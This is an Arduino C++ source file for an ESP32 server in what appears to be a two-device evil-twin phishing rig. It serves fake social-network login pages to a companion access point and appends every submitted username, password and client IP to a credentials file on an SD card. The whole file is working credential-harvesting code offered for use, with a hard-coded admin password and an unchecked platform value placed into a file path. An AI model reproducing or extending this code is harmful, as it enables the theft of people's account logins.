#include <WiFi.h>
#include <WebServer.h>
#include <SD.h>
#include <DNSServer.h>

// Network credentials for connecting to main router
const char* ROUTER_SSID = "MainRouter";
const char* ROUTER_PASSWORD = "RouterPass";

// Credentials for the private network between Server and AP
const char* SERVER_AP_SSID = "ServerAP";
const char* SERVER_AP_PASSWORD = "SecureServerPass";

// Admin credentials for the web interface
const char* ADMIN_USERNAME = "admin";
const char* ADMIN_PASSWORD = "adminpass";

// Server and file system variables
WebServer server(80);
File uploadFile;

class ServerManager {
private:
    bool isAuthenticated = false;
    
    void setupWiFi() {
        // Connect to the main router first
        WiFi.begin(ROUTER_SSID, ROUTER_PASSWORD);
        Serial.print("Connecting to router");
        
        while (WiFi.status() != WL_CONNECTED) {
            delay(500);
            Serial.print(".");
        }
        Serial.println("\nConnected to router");
        Serial.print("Router IP: ");
        Serial.println(WiFi.localIP());

        // Create access point for the AP ESP32
        WiFi.softAP(SERVER_AP_SSID, SERVER_AP_PASSWORD);
        Serial.print("Server AP IP: ");
        Serial.println(WiFi.softAPIP());
    }

    void setupSDCard() {
        if (!SD.begin()) {
            Serial.println("SD Card Mount Failed");
            return;
        }
        Serial.println("SD Card Mounted Successfully");
    }

    String loadFromSD(const char* path) {
        File file = SD.open(path);
        if (!file) {
            Serial.println("Failed to open file: " + String(path));
            return "";
        }
        String content = file.readString();
        file.close();
        return content;
    }

    void logCredentials(String platform, String username, String password, String clientIP) {
        File credFile = SD.open("/credentials.txt", FILE_APPEND);
        if (credFile) {
            String timestamp = String(millis()); // In real implementation, use proper time
            String logEntry = timestamp + "," + platform + "," + username + "," + 
                            password + "," + clientIP + "\n";
            credFile.println(logEntry);
            credFile.close();
            Serial.println("Credentials logged successfully");
        }
    }

public:
    void begin() {
        setupWiFi();
        setupSDCard();
        setupWebServer();
    }

    void setupWebServer() {
        // Handle credential storage requests from the AP ESP32
        server.on("/store_credentials", HTTP_POST, [this]() {
            if (server.hasArg("platform") && server.hasArg("username") && 
                server.hasArg("password")) {
                
                String platform = server.arg("platform");
                String username = server.arg("username");
                String password = server.arg("password");
                String clientIP = server.client().remoteIP().toString();
                
                logCredentials(platform, username, password, clientIP);
                server.send(200, "text/plain", "success");
            }
        });

        // Serve the admin login page
        server.on("/", HTTP_GET, [this]() {
            if (!isAuthenticated) {
                String loginPage = loadFromSD("/admin_login.html");
                server.send(200, "text/html", loginPage);
            } else {
                String adminPage = loadFromSD("/admin_panel.html");
                server.send(200, "text/html", adminPage);
            }
        });

        // Handle admin login
        server.on("/admin_login", HTTP_POST, [this]() {
            String username = server.arg("username");
            String password = server.arg("password");
            
            if (username == ADMIN_USERNAME && password == ADMIN_PASSWORD) {
                isAuthenticated = true;
                server.sendHeader("Location", "/");
                server.send(302, "text/plain", "");
            } else {
                server.send(401, "text/plain", "Unauthorized");
            }
        });

        // Serve social network login pages to AP ESP32
        server.on("/get_login_page", HTTP_GET, [this]() {
            String platform = server.arg("platform");
            String page = loadFromSD("/" + platform + "_login.html");
            server.send(200, "text/html", page);
        });

        server.begin();
    }

    void handleClient() {
        server.handleClient();
    }
};

ServerManager serverManager;

void setup() {
    Serial.begin(115200);
    serverManager.begin();
}

void loop() {
    serverManager.handleClient();
}